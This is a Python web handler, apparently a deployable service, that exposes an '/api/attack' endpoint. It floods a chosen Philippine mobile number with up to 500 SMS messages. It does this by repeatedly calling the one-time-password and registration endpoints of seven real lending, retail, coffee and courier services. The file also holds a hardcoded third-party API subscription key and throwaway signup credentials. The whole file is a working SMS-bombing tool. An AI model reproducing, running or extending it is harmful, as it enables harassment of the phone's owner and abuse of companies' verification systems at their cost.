from http.server import BaseHTTPRequestHandler
import json
import random
import urllib.request
import urllib.parse

class Handler(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()
    
    def do_POST(self):
        if self.path == '/api/attack':
            self.handle_attack()
        else:
            self.send_error(404)
    
    def send_sms(self, service, phone):
        try:
            if service == "EZLOAN":
                data = json.dumps({"businessId": "EZLOAN", "contactNumber": phone[1:]}).encode()
                req = urllib.request.Request(
                    "https://gateway.ezloancash.ph/security/auth/otp/request",
                    data=data,
                    headers={'Content-Type': 'application/json'}
                )
                urllib.request.urlopen(req, timeout=5)
                return True
                
            elif service == "ABENSON":
                data = urllib.parse.urlencode({"contact_no": phone[1:]}).encode()
                req = urllib.request.Request(
                    "https://api.mobile.abenson.com/api/public/membership/activate_otp",
                    data=data,
                    headers={'Content-Type': 'application/x-www-form-urlencoded'}
                )
                urllib.request.urlopen(req, timeout=5)
                return True
                
            elif service == "XPRESS":
                data = json.dumps({
                    "Phone": phone,
                    "Email": f"test{random.randint(1000,9999)}@gmail.com",
                    "Password": "Test123456"
                }).encode()
                req = urllib.request.Request(
                    "https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp",
                    data=data,
                    headers={'Content-Type': 'application/json'}
                )
                urllib.request.urlopen(req, timeout=5)
                return True
                
            elif service == "PICKUP_COFFEE":
                data = json.dumps({"mobile_number": phone}).encode()
                req = urllib.request.Request(
                    "https://production.api.pickup-coffee.net/v2/customers/login",
                    data=data,
                    headers={'Content-Type': 'application/json'}
                )
                urllib.request.urlopen(req, timeout=5)
                return True
                
            elif service == "HONEY_LOAN":
                data = json.dumps({"phone": phone[1:]}).encode()
                req = urllib.request.Request(
                    "https://api.honeyloan.ph/api/client/registration/step-one",
                    data=data,
                    headers={'Content-Type': 'application/json'}
                )
                urllib.request.urlopen(req, timeout=5)
                return True
                
            elif service == "KOMO_PH":
                data = json.dumps({"mobile": phone[1:]}).encode()
                req = urllib.request.Request(
                    "https://api.komo.ph/api/otp/v5/generate",
                    data=data,
                    headers={
                        'Content-Type': 'application/json',
                        'Ocp-Apim-Subscription-Key': 'cfde6d29634f44d3b81053ffc6298cba'
                    }
                )
                urllib.request.urlopen(req, timeout=5)
                return True
                
            elif service == "LBC":
                data = urllib.parse.urlencode({
                    "client_contact_no": phone[4:],
                    "client_contact_code": "+63"
                }).encode()
                req = urllib.request.Request(
                    "https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification",
                    data=data,
                    headers={'Content-Type': 'application/x-www-form-urlencoded'}
                )
                urllib.request.urlopen(req, timeout=5)
                return True
                
            return False
        except:
            return False

    def handle_attack(self):
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode('utf-8'))
            
            target = data.get('target', '').strip()
            sms_count = int(data.get('sms', 100))
            
            if not target or len(target) != 11 or not target.startswith('09'):
                self.send_response(400)
                self.send_header('Content-Type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(json.dumps({"error": "Invalid number"}).encode())
                return
            
            if sms_count < 1 or sms_count > 500:
                self.send_response(400)
                self.send_header('Content-Type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(json.dumps({"error": "Invalid SMS count"}).encode())
                return
            
            services = ["EZLOAN", "ABENSON", "XPRESS", "PICKUP_COFFEE", "HONEY_LOAN", "KOMO_PH", "LBC"]
            success = 0
            failed = 0
            
            for i in range(sms_count):
                service = random.choice(services)
                if self.send_sms(service, "+63" + target[1:]):
                    success += 1
                else:
                    failed += 1
            
            response_data = {
                "success": success,
                "failed": failed,
                "total": sms_count,
                "message": f"Completed: {success} success, {failed} failed"
            }
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(json.dumps(response_data).encode())
            
        except Exception as e:
            self.send_response(500)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(json.dumps({"error": "Server error"}).encode())
